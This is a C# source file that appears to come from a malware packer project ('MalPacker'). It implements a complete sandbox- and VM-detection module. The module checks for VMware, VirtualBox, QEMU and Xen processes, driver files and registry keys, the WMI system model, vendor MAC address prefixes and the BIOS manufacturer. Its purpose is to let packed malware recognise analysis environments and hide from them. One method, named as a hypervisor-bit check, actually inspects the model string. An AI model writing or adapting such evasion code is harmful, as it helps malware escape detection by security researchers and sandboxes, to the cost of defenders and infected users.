namespace MalPacker.Protection;

using System.Diagnostics;
using Microsoft.Win32;

public static class VirtualizationDetect
{
    private static readonly string[] VmProcesses =
    [
        "vmtoolsd", "vmwaretray", "vmwareuser", "VGAuthService",
        "vboxservice", "vboxtray", "xenservice",
        "qemu-ga", "vdagent", "spice-vdagent"
    ];

    private static readonly string[] VmDriverFiles =
    [
        @"C:\Windows\System32\drivers\vmhgfs.sys",
        @"C:\Windows\System32\drivers\vmmouse.sys",
        @"C:\Windows\System32\drivers\vboxmouse.sys",
        @"C:\Windows\System32\drivers\VBoxGuest.sys"
    ];

    public static bool IsVirtualized()
    {
        return CheckVmProcesses()
            || CheckVmFiles()
            || CheckVmRegistry()
            || CheckHypervisorBit()
            || CheckMacAddress()
            || CheckSystemFirmware();
    }

    private static bool CheckVmProcesses()
    {
        var running = Process.GetProcesses().Select(p => p.ProcessName.ToLowerInvariant()).ToHashSet();
        return VmProcesses.Any(p => running.Contains(p));
    }

    private static bool CheckVmFiles()
    {
        return VmDriverFiles.Any(File.Exists);
    }

    private static bool CheckVmRegistry()
    {
        string[] registryPaths =
        [
            @"SOFTWARE\VMware, Inc.\VMware Tools",
            @"SOFTWARE\Oracle\VirtualBox Guest Additions",
            @"HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0"
        ];

        foreach (string path in registryPaths)
        {
            using var key = Registry.LocalMachine.OpenSubKey(path);
            if (key is not null) return true;
        }

        return false;
    }

    private static bool CheckHypervisorBit()
    {
        try
        {
            using var searcher = new System.Management.ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem");
            foreach (var obj in searcher.Get())
            {
                string model = obj["Model"]?.ToString()?.ToLowerInvariant() ?? string.Empty;
                if (model.Contains("virtual") || model.Contains("vmware") || model.Contains("vbox"))
                    return true;
            }
        }
        catch { }
        return false;
    }

    private static bool CheckMacAddress()
    {
        string[] vmMacPrefixes = ["00:0C:29", "00:50:56", "08:00:27", "00:1C:14", "00:15:5D"];

        var interfaces = System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces();
        foreach (var iface in interfaces)
        {
            string mac = iface.GetPhysicalAddress().ToString();
            if (mac.Length >= 6)
            {
                string prefix = $"{mac[..2]}:{mac[2..4]}:{mac[4..6]}";
                if (vmMacPrefixes.Contains(prefix))
                    return true;
            }
        }
        return false;
    }

    private static bool CheckSystemFirmware()
    {
        try
        {
            using var key = Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\BIOS");
            string? vendor = key?.GetValue("SystemManufacturer")?.ToString()?.ToLowerInvariant();
            return vendor?.Contains("vmware") == true || vendor?.Contains("innotek") == true || vendor?.Contains("qemu") == true;
        }
        catch { return false; }
    }
}
